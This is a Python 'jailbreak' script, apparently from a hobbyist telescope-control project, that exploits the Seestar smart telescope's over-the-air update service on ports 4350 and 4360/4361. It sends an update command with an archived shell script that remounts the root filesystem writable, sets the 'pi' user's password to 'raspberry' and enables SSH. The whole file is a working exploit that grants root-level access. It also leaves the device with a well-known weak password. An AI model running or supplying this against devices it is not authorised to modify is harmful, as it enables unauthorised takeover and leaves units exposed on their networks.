#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Filename: ~/seevar/dev/tools/seestar_jailbreak.py
Version: 1.0.1
Objective: Exploit Seestar OTA vulnerability on port 4350 to enable SSH and reset the root password.
"""
import socket
import os
import hashlib
import sys
import tempfile
import tarfile

def load_target_ip():
    config_path = os.path.expanduser("~/seevar/config.toml")
    try:
        import tomllib
        with open(config_path, "rb") as f:
            config = tomllib.load(f)
            return config.get("seestar", {}).get("ip_address", "10.0.0.1")
    except ImportError:
        import tomli
        with open(config_path, "rb") as f:
            config = tomli.load(f)
            return config.get("seestar", {}).get("ip_address", "10.0.0.1")
    except Exception as e:
        print(f"Error reading config.toml: {e}")
        sys.exit(1)

JAILBREAK_FILE = 'jailbreak.tar.bz2'

JAILBREAK_SCRIPT = """#!/bin/bash
sudo mount -o remount,rw /
echo "pi:raspberry" | sudo chpasswd
sudo systemctl enable ssh
sudo systemctl start ssh
sync
sudo mount -o remount,ro /
"""

def recv_all(sock):
    text = ''
    while True:
        try:
            chunk = sock.recv(1024)
            text += chunk.decode('utf-8', errors='ignore')
            if not chunk or text.endswith('\n'):
                break
        except socket.timeout:
            break
    return text

def create_patch():
    with tempfile.NamedTemporaryFile(mode='w+b', delete=False) as tf:
        tf.write(JAILBREAK_SCRIPT.encode('utf-8'))
        temp_name = tf.name

    with tarfile.open(JAILBREAK_FILE, "w:bz2") as tarhandle:
        tarhandle.add(temp_name, arcname="update_package.sh")
        
    os.remove(temp_name)

def begin_update(address):
    create_patch()
    
    if not os.path.exists(JAILBREAK_FILE):
        print("Failed to create jailbreak payload.")
        sys.exit(1)
        
    file_contents = open(JAILBREAK_FILE, 'rb').read()
    fsize = os.path.getsize(JAILBREAK_FILE)
    fmd5 = hashlib.md5(file_contents).hexdigest()
    
    json_str = f'{{"id":1,"method":"begin_recv","params":[{{"file_len":{fsize},"file_name":"air","run_update":true,"md5":"{fmd5}"}}]}}\r\n'
    
    s = socket.socket()
    s_ota = socket.socket()
    s.settimeout(5.0)
    s_ota.settimeout(5.0)
    
    try:
        print(f"Connecting to OTA binary port 4361 on {address}...")
        s_ota.connect((address, 4361))
    except (ConnectionRefusedError, socket.timeout):
        try:
            print(f"Connection to 4361 failed, trying 4360 on {address}...")
            s_ota.connect((address, 4360))
        except (ConnectionRefusedError, socket.timeout):
            print("Cannot connect to the OTA binary port. Is the device online?")
            sys.exit(2)
            
    try:
        print(f"Connecting to OTA command port 4350 on {address}...")
        s.connect((address, 4350))
    except Exception as e:
        print(f"Failed to connect to command port: {e}")
        sys.exit(2)

    print('Initial Response: ' + recv_all(s))
    
    print(f'Sending RPC command: {json_str.strip()}')
    s.sendall(json_str.encode('utf-8'))
    print('Command Response: ' + recv_all(s))
    
    print('Sending payload archive...')
    s_ota.sendall(file_contents)
    
    s_ota.close()
    s.close()
    
    if os.path.exists(JAILBREAK_FILE):
        os.remove(JAILBREAK_FILE)
        
    print("Payload sent. The Seestar should now execute the script.")
    print("Wait a moment, then attempt: ssh pi@{} (password: raspberry)".format(address))

if __name__ == '__main__':
    target_ip = load_target_ip()
    begin_update(target_ip)
